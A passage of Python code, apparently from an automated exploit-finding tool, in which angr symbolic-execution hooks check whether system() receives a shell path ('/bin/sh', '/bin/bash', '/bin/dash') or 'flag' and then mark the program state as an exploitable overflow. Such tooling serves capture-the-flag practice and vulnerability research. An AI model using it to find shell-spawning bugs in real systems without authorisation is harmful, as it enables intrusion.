    good_strings = [b"/bin/sh", b"flag", b"/bin/bash", b"/bin/dash"]

    def run(self):

        if self.state.arch.bits == 64:
            cmd_ptr = self.state.regs.rdi
        if self.state.arch.bits == 32:
            # First arg pushed to the stack
            cmd_ptr = self.state.memory.load(self.state.regs.sp - 4, 4)
        cmd_str = self.state.memory.load(cmd_ptr, 32)

        arg = self.state.solver.eval(cmd_str, cast_to=bytes)

        log.info("system() called with {}".format(arg))
        if any(x in arg for x in self.good_strings):
            # Win!
            self.state.globals["type"] = "overflow_variable"


class hook_four(angr.SimProcedure):
    IS_FUNCTION = True

    def run(self):
        return 4  # Fair dice roll
